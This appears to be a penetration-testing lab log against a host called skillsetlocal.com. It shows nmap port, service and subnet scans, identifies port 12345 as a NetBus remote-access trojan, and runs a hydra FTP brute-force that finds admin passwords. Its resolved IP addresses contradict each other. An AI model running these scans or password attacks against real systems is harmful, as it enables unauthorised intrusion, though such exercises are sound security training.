## What is the purpose of port 12345 on skillsetlocal.com
```
sudo nmap -sN skillsetlocal.com -p 12345
```
```
RAT (Remote Access Trojan)
```

## Enumeration of Host (skillsetlocal.com)

```
nmap skillsetlocal.com
```
```
Starting Nmap 7.01 ( https://nmap.org ) at 2023-07-19 23:19 UTC
Nmap scan report for skillsetlocal.com (127.0.0.1)
Host is up (0.000037s latency).
rDNS record for 127.0.0.1: localhost
Not shown: 989 closed ports
PORT      STATE SERVICE
21/tcp    open  ftp
22/tcp    open  ssh
23/tcp    open  telnet
25/tcp    open  smtp
53/tcp    open  domain
80/tcp    open  http
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
3306/tcp  open  mysql
5432/tcp  open  postgresql
12345/tcp open  netbus
```

```
sudo nmap -sN -A skillsetlocal.com
```
```
Service Info: Host: ip-10-0-171-85.us-west-2.compute.internal; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_nbstat: NetBIOS name: IP-10-0-171-85, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery:
|   OS: Windows 6.1 (Samba 4.5.8-Debian)
|   Computer name: ip-10-0-171-85
|   NetBIOS computer name: IP-10-0-171-85
|   Domain name: us-west-2.compute.internal
|   FQDN: ip-10-0-171-85.us-west-2.compute.internal
|_  System time: 2023-07-19T23:11:04+00:00
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_smbv2-enabled: Server supports SMBv2 protocol

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 27.02 seconds
```
```
nmap -sN -A -oG nmap_scan_2 skillsetlocal.com
```
```
# Nmap 7.01 scan initiated Wed Jul 19 23:13:09 2023 as: nmap -sN -A -oG nmap_sca
n_2 skillsetlocal.com
Host: 127.0.0.1 (localhost)     Status: Up
Host: 127.0.0.1 (localhost)     Ports: 21/open/tcp//ftp//vsftpd 3.0.2/, 22/open/
tcp//ssh//OpenSSH 6.7p1 Debian 5 (protocol 2.0)/, 23/open/tcp//telnet//Linux tel
netd/, 25/open/tcp//smtp//Exim smtpd 4.84_2/, 53/open/tcp//domain///, 80/open/tc
p//http//Apache httpd 2.4.10 ((Debian))/, 139/open/tcp//netbios-ssn//Samba smbd 
3.X (workgroup: IP-10-0-171-85)/, 445/open/tcp//netbios-ssn//Samba smbd 3.X (wor
kgroup: IP-10-0-171-85)/, 3306/open/tcp//mysql//MySQL 5.5.5-10.1.22-MariaDB-/, 5
432/open/tcp//postgresql//PostgreSQL DB/, 12345/open/tcp//tcpwrapped/// Ignored 
State: closed (989)     OS: Linux 3.8 - 3.19    Seq Index: 258  IP ID Seq: All z
eros
# Nmap done at Wed Jul 19 23:13:32 2023 -- 1 IP address (1 host up) scanned in 2
3.72 seconds
```

## Get IP Address
```
nslookup skillsetlocal.com
```
```
10.0.0.2
```

## check to see if FTP login is possible for admin username
```
hydra -l admin -P /usr/share/wordlists/metasploit-jtr/common_roots.txt ftp://skillsetlocal.com
```
```
[21][ftp] host: skillsetlocal.com   login: admin   password: admin123
[21][ftp] host: skillsetlocal.com   login: admin   password: admin1234
```

## Running full network scan to identify other machines
```
sudo nmap -sS -A 10.0.0.0/24 -oN network_scan
```
```
# Nmap 7.01 scan initiated Thu Jul 20 00:16:10 2023 as: nmap -sS -A -oN network$
Nmap scan report for ip-10-0-0-105.us-west-2.compute.internal (10.0.0.105)
Host is up (0.00031s latency).
Not shown: 999 filtered ports
PORT    STATE SERVICE  VERSION
443/tcp open  ssl/http nginx
|_http-server-header: nginx
|_http-title: 404 Not Found
| ssl-cert: Subject: commonName=charon.skillset.com
| Not valid before: 2023-03-26T11:05:01
|_Not valid after:  2024-04-26T11:05:01
|_ssl-date: TLS randomness does not represent time
| tls-nextprotoneg:
|_  http/1.1
Warning: OSScan results may be unreliable because we could not find at least 1 $
Device type: general purpose
Running (JUST GUESSING): Linux 3.X (92%)
OS CPE: cpe:/o:linux:linux_kernel:3.13
Aggressive OS guesses: Linux 3.13 (92%), Linux 3.2.0 (87%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 1 hop

TRACEROUTE (using port 443/tcp)
HOP RTT     ADDRESS
1   0.22 ms ip-10-0-0-105.us-west-2.compute.internal (10.0.0.105)

Nmap scan report for ip-10-0-0-175.us-west-2.compute.internal (10.0.0.175)
Host is up (0.00040s latency).
Not shown: 998 filtered ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 6.7p1 Debian 5+deb8u3 (protocol 2.0)
| ssh-hostkey:
|   1024 a3:34:70:3a:35:1d:06:f0:84:13:46:71:4a:78:b9:7f (DSA)
|   2048 e6:41:37:6b:0a:77:25:80:31:a3:23:7e:f3:87:d9:ce (RSA)
|_  256 d0:d7:20:36:8f:ca:49:e5:dd:e6:b1:bc:76:06:47:68 (ECDSA)
80/tcp open  http    Apache httpd 2.4.10 ((Debian))
|_http-server-header: Apache/2.4.10 (Debian)
|_http-title: Skillsetlocal Company Website
Warning: OSScan results may be unreliable because we could not find at least 1 
Device type: general purpose
Running (JUST GUESSING): Linux 3.X|2.6.X (90%)
OS CPE: cpe:/o:linux:linux_kernel:3.2.0 cpe:/o:linux:linux_kernel:2.6
Aggressive OS guesses: Linux 3.2.0 (90%), Linux 2.6.18 - 2.6.22 (86%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT     ADDRESS
1   0.27 ms ip-10-0-0-175.us-west-2.compute.internal (10.0.0.175)

OS and Service detection performed. Please report any incorrect results at http$
# Nmap done at Thu Jul 20 00:16:59 2023 -- 256 IP addresses (2 hosts up) scanne$

```